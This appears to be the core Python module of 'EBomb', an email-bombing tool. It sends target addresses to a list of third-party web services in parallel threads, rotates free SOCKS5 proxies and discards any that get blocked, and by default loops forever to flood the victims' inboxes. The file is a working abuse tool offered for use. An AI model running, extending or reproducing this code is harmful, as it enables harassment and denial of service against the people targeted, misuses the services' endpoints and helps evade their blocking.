from multiprocessing.pool import ThreadPool

from EasyProxies import Proxies
from requests.exceptions import RequestException

from EBomb.services import services, Service


class EBomb:
    def __init__(self, targets: list[str], threads_count: int = None, proxy: bool = True, forever: bool = True,
                 verbose: bool = True):
        if not verbose:
            import sys
            sys.stderr = sys.stdout = open('nul', 'w')
        self.targets = [f'{i}'.strip() for i in targets if i]
        if not targets:
            return
        self.forever = forever
        self._max_netloc_len = max(len(serv.netloc or '') for serv in services)
        self.__proxies = Proxies.get(limit=20, type='socks5')
        self.proxy = proxy
        self.start(threads_count)

    @property
    def proxies(self):
        if self.proxy and not self.__proxies:
            self.__proxies += Proxies.get(limit=20, type='socks5')
        return self.__proxies

    def start(self, threads_count: int):
        print(f'Services: {len(services)}\n'
              f'Proxy: {self.proxy}\n'
              f'Emails: {"; ".join(f"{i!r}" for i in self.targets)}')
        args = [(service, email) for email in self.targets for service in services]

        def _starter():
            with ThreadPool(threads_count) as pool:
                pool.starmap(self.request, args)

        if self.forever:
            while True:
                _starter()
        else:
            _starter()

    def request(self, service: Service, email: str):
        proxies = self.proxies
        _proxy = proxies[-1] if self.proxy else None
        try:
            proxy = f'socks5://{_proxy}' if _proxy else _proxy
            resp = service.request(email, proxies={'http': proxy, 'https': proxy})
            code = resp.status_code
        except RequestException as Error:
            resp = Error
            code = None
        print(
            f'{service.netloc:^{self._max_netloc_len}} / {service.method:<4} '
            f'| {email}{f" | {_proxy:^22}" if _proxy else ""} | {resp}')
        if _proxy in proxies and code in (None, 401, 403, 407):
            proxies.remove(_proxy)
